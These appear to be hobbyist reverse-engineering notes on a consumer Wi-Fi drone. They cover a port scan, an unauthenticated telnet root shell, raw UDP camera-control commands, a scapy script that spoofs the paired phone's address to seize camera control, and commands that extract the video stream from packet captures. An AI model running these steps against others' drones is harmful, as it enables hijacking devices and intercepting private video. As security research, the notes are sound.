### fccID
`2A8JCA6`

```
~ % nmcli
wlp2s0: connected to TSRC-148b62
        "Intel 6 AX200"
        wifi (iwlwifi), B6:63:62:4F:CE:94, hw, mtu 1500
        ip4 default
        inet4 172.16.10.2/8
        route4 172.0.0.0/8 metric 600
        route4 default via 172.16.10.1 metric 600
        inet6 fe80::274f:ae9:8e19:d848/64
        route6 fe80::/64 metric 1024

lo: connected (externally) to lo
        "lo"
        loopback (unknown), 00:00:00:00:00:00, sw, mtu 65536
        inet4 127.0.0.1/8
        inet6 ::1/128

p2p-dev-wlp2s0: disconnected
        "p2p-dev-wlp2s0"
        wifi-p2p, hw

enp1s0: unavailable
        "Realtek RTL8111/8168/8411"
        ethernet (r8169), 00:2B:67:AD:8F:8F, hw, mtu 1500

DNS configuration:
        servers: 172.16.10.1
        domains: local
        interface: wlp2s0

Use "nmcli device show" to get complete information about known devices and
"nmcli connection show" to get an overview on active connection profiles.

Consult nmcli(1) and nmcli-examples(7) manual pages for complete usage details.
~ % sudo nmap 192.168.1.187
~ % ping 172.16.10.1
PING 172.16.10.1 (172.16.10.1) 56(84) bytes of data.
64 bytes from 172.16.10.1: icmp_seq=1 ttl=64 time=4.16 ms
64 bytes from 172.16.10.1: icmp_seq=2 ttl=64 time=4.57 ms
^C
--- 172.16.10.1 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 4.155/4.360/4.566/0.205 ms
~ % sudo nmap -p- 172.16.10.1 --open
[sudo] password for condor0010:
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-25 16:03 EST
Nmap scan report for 172.16.10.1
Host is up (0.068s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
23/tcp   open  telnet
8021/tcp open  ftp-proxy
8830/tcp open  unknown
8888/tcp open  sun-answerbook
MAC Address: 40:AA:56:14:8B:62 (China Dragon Technology Limited)

Nmap done: 1 IP address (1 host up) scanned in 19.03 seconds
~ % telnet 172.16.10.1
Trying 172.16.10.1...
Connected to 172.16.10.1.
Escape character is '^]'.


BusyBox v1.19.3 (2019-04-14 17:28:26 CST) built-in shell (ash)
Enter 'help' for a list of built-in commands.

fh-linux# ls
app      dev      home     lib      mnt      proc     sbin     srv      tmp      var
bin      etc      init     linuxrc  opt      root     sdcard   sys      usr
fh-linux# ls /bin/
[           date        free        ln          mv          sleep       umount
[[          dd          fsync       login       netstat     sync        unlzma
ash         df          ftpget      ls          ping        tail        vsftpd
awk         dmesg       ftpput      lzcat       ping6       tar         zcat
bash        du          gunzip      lzma        ps          test
busybox     dumpleases  gzip        mkdir       pwd         tftp
cat         echo        iostat      mknod       rm          top
chmod       env         kill        mount       sed         touch
cp          false       killall     mpstat      sh          true
fh-linux#
```

```
fh-linux# cat /proc/partitions
major minor  #blocks  name

  31        0         64 mtdblock0
  31        1         64 mtdblock1
  31        2        256 mtdblock2
  31        3       3648 mtdblock3
  31        4         32 mtdblock4
  31        5         32 mtdblock5
 179        0   60768256 mmcblk0
 179        1   60751872 mmcblk0p1
fh-linux#
```

```
fh-linux# netstat -a
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 0.0.0.0:8021            0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:ftp             0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:telnet          0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:8830            0.0.0.0:*               LISTEN
tcp        0      0 172.16.10.1:telnet      172.16.10.3:52232       ESTABLISHED
tcp        0    777 172.16.10.1:8888        172.16.10.2:55552       ESTABLISHED
tcp        0      0 172.16.10.1:8888        172.16.10.2:55544       ESTABLISHED
netstat: /proc/net/tcp6: No such file or directory
udp        0      0 0.0.0.0:bootps          0.0.0.0:*
udp        0      0 0.0.0.0:8080            0.0.0.0:*
netstat: /proc/net/udp6: No such file or directory
netstat: /proc/net/raw6: No such file or directory
Active UNIX domain sockets (servers and established)
Proto RefCnt Flags       Type       State         I-Node Path
unix  2      [ ]         DGRAM                      1536 /var/run/hostapd/wlan0
unix  2      [ ]         DGRAM                       413 @/org/kernel/udev/udevd
```

```
/sdcard/.build/usr/bin/tcpdump -i wlan0 -w /sdcard/$(date +%s).pcap &
```

# phone to drone

### move camera down
`echo 68010d80808080200800800100000000a5  | xxd -r -p | nc -u 172.16.10.1 8080`

### move camera up
`echo 68010d8080808020080040010000000065 | xxd -r -p | nc -u 172.16.10.1 8080`

## makes you in charge
`68010d8080808020080000010000000025`

# drone to phone

## from drone to phone, sends photo to app
`ff53540001030061be0073cc`



# mnt ftp srvr
`curlftpfs -o user=anonymous ftp://172.16.10.1:8021 tmp`

https://github.com/bilibili/ijkplayer

# control the camera while phone is connected; fake src addr to be same as phone
```
from scapy.all import *

drone_ip = '172.16.10.1'
phone_ip = '172.16.10.3'

interface = 'wlp2s0'

packet = Ether(dst="ff:ff:ff:ff:ff:ff") / IP(dst=drone_ip, src=phone_ip) / \
    UDP(dport=8080, sport=12345) / \
    bytearray([ 0x68, 0x01, 0x0d, 0x80, 0x80, 0x80, 0x80, 0x20, 0x08, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00, 0x00, 0xa5 ])

sendp(packet, iface=interface)
```


fh-linux# cat cmdline
console=ttyS0,115200 root=/dev/ram0 mem=25M mtdparts=spi_flash:64k(bootstrap),64k(uboot-env),256k(uboot),3648k(kernel),32k(config1),32k(config2)


```
fh-linux# ls /tmp/
hostapd.conf    test.txt        wifi_connected  wifi_rssi
fh-linux# cat /tmp/hostapd.conf
interface=wlan0
ctrl_interface=/var/run/hostapd
ssid=TSRC-148b62
#country_code=US
#require_ht=1
#ieee80211ac=0
#ht_capab=[HT40-][SHORT-GI-20][SHORT-GI-40]
ignore_broadcast_ssid=0
hw_mode=a
channel=161
beacon_int=100
dtim_period=2
max_num_sta=5


fh-linux# cat /tmp/test.txt
interface=wlan0
ctrl_interface=/var/run/hostapd
ssid=TSRC-148b62
#country_code=US
#require_ht=1
#ieee80211ac=0
#ht_capab=[HT40-][SHORT-GI-20][SHORT-GI-40]
ignore_broadcast_ssid=0
hw_mode=a
channel=161
beacon_int=100
dtim_period=2
max_num_sta=5


fh-linux# cat /tmp/wifi_connected
1
fh-linux# cat /tmp/wifi_rssi
VIF[0]
 STA - mac=3a:1a:2c:93:82:41
 AID 01 tx_bytes/pkts/error 110928/763/7 rx_bytes/pkts/error 138424/1813/0 tx_ucast_rate 34 last_txrx_time 280 rssi=57
 ```


 tshark -r phone_connect.pcap -Y 'tcp.port == 8888 and ip.src == 172.16.10.1 and data' -T fields -e data


 ```
 ~ % ffprobe stream_2.jpg
ffprobe version 6.1.1 Copyright (c) 2007-2023 the FFmpeg developers
  built with gcc 13 (GCC)
  configuration: --prefix=/usr --bindir=/usr/bin --datadir=/usr/share/ffmpeg --docdir=/usr/share/doc/ffmpeg --incdir=/usr/include/ffmpeg --libdir=/usr/lib64 --mandir=/usr/share/man --arch=x86_64 --optflags='-O2 -flto=auto -ffat-lto-objects -fexceptions -g -grecord-gcc-switches -pipe -Wall -Wno-complain-wrong-lang -Werror=format-security -Wp,-U_FORTIFY_SOURCE,-D_FORTIFY_SOURCE=3 -Wp,-D_GLIBCXX_ASSERTIONS -specs=/usr/lib/rpm/redhat/redhat-hardened-cc1 -fstack-protector-strong -specs=/usr/lib/rpm/redhat/redhat-annobin-cc1 -m64 -mtune=generic -fasynchronous-unwind-tables -fstack-clash-protection -fcf-protection -fno-omit-frame-pointer -mno-omit-leaf-frame-pointer' --extra-ldflags='-Wl,-z,relro -Wl,--as-needed -Wl,-z,now -specs=/usr/lib/rpm/redhat/redhat-hardened-ld -specs=/usr/lib/rpm/redhat/redhat-annobin-cc1 -Wl,--build-id=sha1 ' --extra-cflags=' -I/usr/include/rav1e' --enable-libopencore-amrnb --enable-libopencore-amrwb --enable-libvo-amrwbenc --enable-version3 --enable-bzlib --enable-chromaprint --disable-crystalhd --enable-fontconfig --enable-frei0r --enable-gcrypt --enable-gnutls --enable-ladspa --enable-libaom --enable-libdav1d --enable-libass --enable-libbluray --enable-libbs2b --enable-libcodec2 --enable-libcdio --enable-libdrm --enable-libjack --enable-libjxl --enable-libfreetype --enable-libfribidi --enable-libgsm --enable-libilbc --enable-libmp3lame --enable-libmysofa --enable-nvenc --enable-openal --enable-opencl --enable-opengl --enable-libopenh264 --enable-libopenjpeg --enable-libopenmpt --enable-libopus --enable-libpulse --enable-libplacebo --enable-librsvg --enable-librav1e --enable-librubberband --enable-libsmbclient --enable-version3 --enable-libsnappy --enable-libsoxr --enable-libspeex --enable-libsrt --enable-libssh --enable-libsvtav1 --enable-libtesseract --enable-libtheora --enable-libtwolame --enable-libvorbis --enable-libv4l2 --enable-libvidstab --enable-libvmaf --enable-version3 --enable-vapoursynth --enable-libvpx --enable-vulkan --enable-libshaderc --enable-libwebp --enable-libx264 --enable-libx265 --enable-libxvid --enable-libxml2 --enable-libzimg --enable-libzmq --enable-libzvbi --enable-lv2 --enable-avfilter --enable-libmodplug --enable-postproc --enable-pthreads --disable-static --enable-shared --enable-gpl --disable-debug --disable-stripping --shlibdir=/usr/lib64 --enable-lto --enable-libvpl --enable-runtime-cpudetect
  libavutil      58. 29.100 / 58. 29.100
  libavcodec     60. 31.102 / 60. 31.102
  libavformat    60. 16.100 / 60. 16.100
  libavdevice    60.  3.100 / 60.  3.100
  libavfilter     9. 12.100 /  9. 12.100
  libswscale      7.  5.100 /  7.  5.100
  libswresample   4. 12.100 /  4. 12.100
  libpostproc    57.  3.100 / 57.  3.100
[mjpeg @ 0x564f0e2dc880] Found EOI before any SOF, ignoring
[mjpeg @ 0x564f0e2dc880] bits 68 is invalid
[image2 @ 0x564f0e2db680] Could not find codec parameters for stream 0 (Video: mjpeg (Baseline), none(bt470bg/unknown/unknown)): unspecified size
Consider increasing the value for the 'analyzeduration' (0) and 'probesize' (5000000) options
Input #0, image2, from 'stream_2.jpg':
  Duration: 00:00:00.04, start: 0.000000, bitrate: 100996 kb/s
  Stream #0:0: Video: mjpeg (Baseline), none(bt470bg/unknown/unknown), 25 fps, 25 tbr, 25 tbn
  ```

phone 2 drone
  ```
  data.data == 01:02:03:04:05:06:07:08:09:28:28
  ```


tshark -r pcap/cover.pcap -Y "tcp.srcport==8888 and tcp.dstport==40793" -T fields -e data |tr -d '\n' | xxd -r -p > video.h264
ffmpeg -f h264 -i video.h264 -c copy out.mp4


tshark -r pcap/cover.pcap -Y "tcp.srcport==8888 and tcp.dstport==40793" -T fields -e data |tr -d '\n' | xxd -r -p | ffplay -f h264 -i -



the drone sends 588a0c54534130303646581e7800008e to the phone to indicate the model of drone

start conv 
```
printf "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x25\x25" |  nc 172.16.10.1 8888
```

